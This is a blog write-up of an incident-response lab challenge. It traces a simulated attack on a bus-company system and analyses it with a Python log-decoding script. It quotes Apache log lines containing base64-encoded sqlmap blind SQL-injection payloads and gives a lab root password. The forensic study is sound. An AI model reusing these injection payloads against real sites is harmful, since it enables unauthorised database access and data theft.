<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="这次行业赛考到了应急响应。开个文章记录一下应急响应相关的知识。">
<meta property="og:type" content="article">
<meta property="og:title" content="玄机">
<meta property="og:url" content="http://example.com/2025/12/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html">
<meta property="og:site_name" content="My0n9s&#39;blog">
<meta property="og:description" content="这次行业赛考到了应急响应。开个文章记录一下应急响应相关的知识。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d36c413920.png">
<meta property="og:image" content="https://s41.ax1x.com/2025/12/13/pZMNOFx.png">
<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d36e00fa00.png">
<meta property="og:image" content="https://s41.ax1x.com/2025/12/13/pZMNXY6.png">
<meta property="og:image" content="https://cdn4.winhlb.com/2025/12/13/693d36de0d9e8.png">
<meta property="article:published_time" content="2025-12-01T10:33:46.000Z">
<meta property="article:modified_time" content="2025-12-13T09:53:20.357Z">
<meta property="article:author" content="My0n9s">
<meta property="article:tag" content="应急响应">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn4.winhlb.com/2025/12/13/693d36c413920.png">


<link rel="canonical" href="http://example.com/2025/12/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/12/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","path":"2025/12/01/应急响应/","title":"玄机"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>玄机 | My0n9s'blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">My0n9s'blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E5%85%AC%E4%BA%A4%E8%BD%A6%E7%B3%BB%E7%BB%9F%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">应急响应之公交车系统应急排查</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41"><span class="nav-number">1.1.</span> <span class="nav-text">步骤1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42"><span class="nav-number">1.2.</span> <span class="nav-text">步骤2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43"><span class="nav-number">1.3.</span> <span class="nav-text">步骤3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44"><span class="nav-number">1.4.</span> <span class="nav-text">步骤4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A45"><span class="nav-number">1.5.</span> <span class="nav-text">步骤5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A46"><span class="nav-number">1.6.</span> <span class="nav-text">步骤6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A47"><span class="nav-number">1.7.</span> <span class="nav-text">步骤7</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="My0n9s"
      src="/images/touxiang.jpeg">
  <p class="site-author-name" itemprop="name">My0n9s</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">94</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">28</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/01/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="My0n9s">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="My0n9s'blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="玄机 | My0n9s'blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          玄机
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2025-12-01 18:33:46" itemprop="dateCreated datePublished" datetime="2025-12-01T18:33:46+08:00">2025-12-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-12-13 17:53:20" itemprop="dateModified" datetime="2025-12-13T17:53:20+08:00">2025-12-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>这次行业赛考到了应急响应。开个文章记录一下应急响应相关的知识。</p>
<span id="more"></span>

<p>主要是以玄机上面的题为主，不得不说，玄机的题是真的贵啊！</p>
<h1 id="应急响应之公交车系统应急排查"><a href="#应急响应之公交车系统应急排查" class="headerlink" title="应急响应之公交车系统应急排查"></a>应急响应之公交车系统应急排查</h1><p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本环境侧重于流量分析，脚本编写，webshell检测，混淆代码检测(思路通用)仅供学习参考</span><br><span class="line">版权：思而听(solar应急响应)、州弟学安全、青少年CTF</span><br><span class="line">环境描述：</span><br><span class="line">1. 思而听公交系统被黑客攻击，黑客通过web进行了攻击并获取了数据，然后获取了其中一位驾校师傅在FTP服务中的私密文件，其后黑客找到了任意文件上传漏洞进行了GETshell，控制了主机权限并植入了挖矿网页挖矿病毒，接下来你需要逐步排查。</span><br><span class="line">注意：</span><br><span class="line">1. 流量中的21端口对应2121、SSH端口为2223、80端口对应8099。</span><br><span class="line">2. 当前开放端口为：2223(SSH)、8099(WEB)</span><br><span class="line">3. 捕获的流量包以及对应的web日志登录系统成功后在根目录下：result.pcap、access.log</span><br><span class="line">4. root的SSH密码为bussec123</span><br></pre></td></tr></table></figure>

<h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><p>分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag{zhangsan-wangli}</p>
<p>主要是分析Web中间件(比如Apache&#x2F;IIS&#x2F;Nginx)的日志，这里进入到&#x2F;var&#x2F;log下面就发现了apache，然后进到里面看日志，非常多的数据，几千条，找了两条观察发现是用的base64编码的payload，并且还是时间盲注。于是让AI去写了一个分析脚本，来得到盲注爆破得到的数据库名、表名、字段名、以及值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=KSBBTkQgNTk5NT1DQVNUKChDSFIoMTEzKXx8Q0hSKDk4KXx8Q0hSKDEwNyl8fENIUigxMTMpfHxDSFIoMTEzKSl8fChTRUxFQ1QgKENBU0UgV0hFTiAoNTk5NT01OTk1KSBUSEVOIDEgRUxTRSAwIEVORCkpOjp0ZXh0fHwoQ0hSKDExMyl8fENIUigxMTgpfHxDSFIoMTEyKXx8Q0hSKDExMil8fENIUigxMTMpKSBBUyBOVU1FUklDKSBBTkQgKDM2MTc9MzYxNw%3D%3D HTTP/1.1&quot; 200 1307 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=IEFORCA1OTk1PUNBU1QoKENIUigxMTMpfHxDSFIoOTgpfHxDSFIoMTA3KXx8Q0hSKDExMyl8fENIUigxMTMpKXx8KFNFTEVDVCAoQ0FTRSBXSEVOICg1OTk1PTU5OTUpIFRIRU4gMSBFTFNFIDAgRU5EKSk6OnRleHR8fChDSFIoMTEzKXx8Q0hSKDExOCl8fENIUigxMTIpfHxDSFIoMTEyKXx8Q0hSKDExMykpIEFTIE5VTUVSSUMp HTTP/1.1&quot; 200 1299 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=JykgQU5EIDU5OTU9Q0FTVCgoQ0hSKDExMyl8fENIUig5OCl8fENIUigxMDcpfHxDSFIoMTEzKXx8Q0hSKDExMykpfHwoU0VMRUNUIChDQVNFIFdIRU4gKDU5OTU9NTk5NSkgVEhFTiAxIEVMU0UgMCBFTkQpKTo6dGV4dHx8KENIUigxMTMpfHxDSFIoMTE4KXx8Q0hSKDExMil8fENIUigxMTIpfHxDSFIoMTEzKSkgQVMgTlVNRVJJQykgQU5EICgnZFlneSc9J2RZZ3k%3D HTTP/1.1&quot; 200 1310 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=JyBBTkQgNTk5NT1DQVNUKChDSFIoMTEzKXx8Q0hSKDk4KXx8Q0hSKDEwNyl8fENIUigxMTMpfHxDSFIoMTEzKSl8fChTRUxFQ1QgKENBU0UgV0hFTiAoNTk5NT01OTk1KSBUSEVOIDEgRUxTRSAwIEVORCkpOjp0ZXh0fHwoQ0hSKDExMyl8fENIUigxMTgpfHxDSFIoMTEyKXx8Q0hSKDExMil8fENIUigxMTMpKSBBUyBOVU1FUklDKSBBTkQgJ0l5TnAnPSdJeU5w HTTP/1.1&quot; 200 1309 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=IEFORCA1OTk1PUNBU1QoKENIUigxMTMpfHxDSFIoOTgpfHxDSFIoMTA3KXx8Q0hSKDExMyl8fENIUigxMTMpKXx8KFNFTEVDVCAoQ0FTRSBXSEVOICg1OTk1PTU5OTUpIFRIRU4gMSBFTFNFIDAgRU5EKSk6OnRleHR8fChDSFIoMTEzKXx8Q0hSKDExOCl8fENIUigxMTIpfHxDSFIoMTEyKXx8Q0hSKDExMykpIEFTIE5VTUVSSUMpLS0gREVITw%3D%3D HTTP/1.1&quot; 200 1302 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=KSBBTkQgODY5OCBJTiAoU0VMRUNUIChDSEFSKDExMykrQ0hBUig5OCkrQ0hBUigxMDcpK0NIQVIoMTEzKStDSEFSKDExMykrKFNFTEVDVCAoQ0FTRSBXSEVOICg4Njk4PTg2OTgpIFRIRU4gQ0hBUig0OSkgRUxTRSBDSEFSKDQ4KSBFTkQpKStDSEFSKDExMykrQ0hBUigxMTgpK0NIQVIoMTEyKStDSEFSKDExMikrQ0hBUigxMTMpKSkgQU5EICgyMjEyPTIyMTI%3D HTTP/1.1&quot; 200 1295 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=IEFORCA4Njk4IElOIChTRUxFQ1QgKENIQVIoMTEzKStDSEFSKDk4KStDSEFSKDEwNykrQ0hBUigxMTMpK0NIQVIoMTEzKSsoU0VMRUNUIChDQVNFIFdIRU4gKDg2OTg9ODY5OCkgVEhFTiBDSEFSKDQ5KSBFTFNFIENIQVIoNDgpIEVORCkpK0NIQVIoMTEzKStDSEFSKDExOCkrQ0hBUigxMTIpK0NIQVIoMTEyKStDSEFSKDExMykpKQ%3D%3D HTTP/1.1&quot; 200 1286 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=JykgQU5EIDg2OTggSU4gKFNFTEVDVCAoQ0hBUigxMTMpK0NIQVIoOTgpK0NIQVIoMTA3KStDSEFSKDExMykrQ0hBUigxMTMpKyhTRUxFQ1QgKENBU0UgV0hFTiAoODY5OD04Njk4KSBUSEVOIENIQVIoNDkpIEVMU0UgQ0hBUig0OCkgRU5EKSkrQ0hBUigxMTMpK0NIQVIoMTE4KStDSEFSKDExMikrQ0hBUigxMTIpK0NIQVIoMTEzKSkpIEFORCAoJ3Z3dksnPSd2d3ZL HTTP/1.1&quot; 200 1299 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=JyBBTkQgODY5OCBJTiAoU0VMRUNUIChDSEFSKDExMykrQ0hBUig5OCkrQ0hBUigxMDcpK0NIQVIoMTEzKStDSEFSKDExMykrKFNFTEVDVCAoQ0FTRSBXSEVOICg4Njk4PTg2OTgpIFRIRU4gQ0hBUig0OSkgRUxTRSBDSEFSKDQ4KSBFTkQpKStDSEFSKDExMykrQ0hBUigxMTgpK0NIQVIoMTEyKStDSEFSKDExMikrQ0hBUigxMTMpKSkgQU5EICdkcnZ4Jz0nZHJ2eA%3D%3D HTTP/1.1&quot; 200 1297 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?query=IEFORCA4Njk4IElOIChTRUxFQ1QgKENIQVIoMTEzKStDSEFSKDk4KStDSEFSKDEwNykrQ0hBUigxMTMpK0NIQVIoMTEzKSsoU0VMRUNUIChDQVNFIFdIRU4gKDg2OTg9ODY5OCkgVEhFTiBDSEFSKDQ5KSBFTFNFIENIQVIoNDgpIEVORCkpK0NIQVIoMTEzKStDSEFSKDExOCkrQ0hBUigxMTIpK0NIQVIoMTEyKStDSEFSKDExMykpKS0tIE9lZ3g%3D HTTP/1.1&quot; 200 1291 &quot;-&quot; &quot;sqlmap/1.9#stable (https://sqlmap.org)&quot;</span><br><span class="line">172.17.0.1 - - [23/Jul/2025:03:16:15 +0000] &quot;GET /search.php?</span><br></pre></td></tr></table></figure>

<p>如果是线下断网，这脚本自己估计很难写出来，不得不感叹AI的强大，贴上：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_payload</span>(<span class="params">encoded_payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解码payload（URL解码 + Base64解码）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url_decoded = urllib.parse.unquote(encoded_payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            base64_decoded = base64.b64decode(url_decoded).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> base64_decoded</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> url_decoded</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> encoded_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_apache_log</span>(<span class="params">log_file</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解析Apache日志文件&quot;&quot;&quot;</span></span><br><span class="line">    requests = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line_num, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">            line = line.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line <span class="keyword">or</span> <span class="string">&#x27;sqlmap&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;&quot;GET\s+([^&quot;]+)&quot;\s+(\d+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                url_path = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                status_code = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>))</span><br><span class="line">                response_size = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">                time_match = re.search(<span class="string">r&#x27;\[(\d&#123;2&#125;/\w&#123;3&#125;/\d&#123;4&#125;:\d&#123;2&#125;:\d&#123;2&#125;:\d&#123;2&#125;)&#x27;</span>, line)</span><br><span class="line">                timestamp = time_match.group(<span class="number">1</span>) <span class="keyword">if</span> time_match <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">                requests.append(&#123;</span><br><span class="line">                    <span class="string">&#x27;line_num&#x27;</span>: line_num,</span><br><span class="line">                    <span class="string">&#x27;url_path&#x27;</span>: url_path,</span><br><span class="line">                    <span class="string">&#x27;status_code&#x27;</span>: status_code,</span><br><span class="line">                    <span class="string">&#x27;response_size&#x27;</span>: response_size,</span><br><span class="line">  